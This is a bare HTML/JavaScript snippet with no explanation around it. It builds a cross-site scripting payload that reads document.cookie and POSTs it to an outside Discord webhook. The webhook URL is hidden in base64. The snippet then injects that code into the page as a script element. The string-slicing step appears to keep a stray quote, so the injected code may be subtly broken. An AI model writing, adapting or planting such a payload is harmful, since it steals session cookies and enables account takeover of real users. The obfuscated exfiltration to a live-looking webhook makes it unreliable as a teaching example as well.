<script>
  const payload = "<img src='x' onerror=\"let xhr = new XMLHttpRequest(); xhr.open('POST', atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3NTI5NTUyOTc1NjAwNDQyNi9JNGVmS1FGOHVJSUFSTEgzN090ZGMKZXJkdi1GZ0pGOWJhaE5VdjVzLW4wemotdURxN2stVjhfWVhDODUxTXlVZ3o4bGQ=')); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({content: document.cookie}));\">";
  const div = document.createElement('div');
  div.setAttribute('data-payload', payload);
  document.body.appendChild(div);

  const script = document.createElement('script');
  script.textContent = payload.substring(payload.indexOf('onerror=') + 8, payload.lastIndexOf('"'));
  document.body.appendChild(script);
</script>
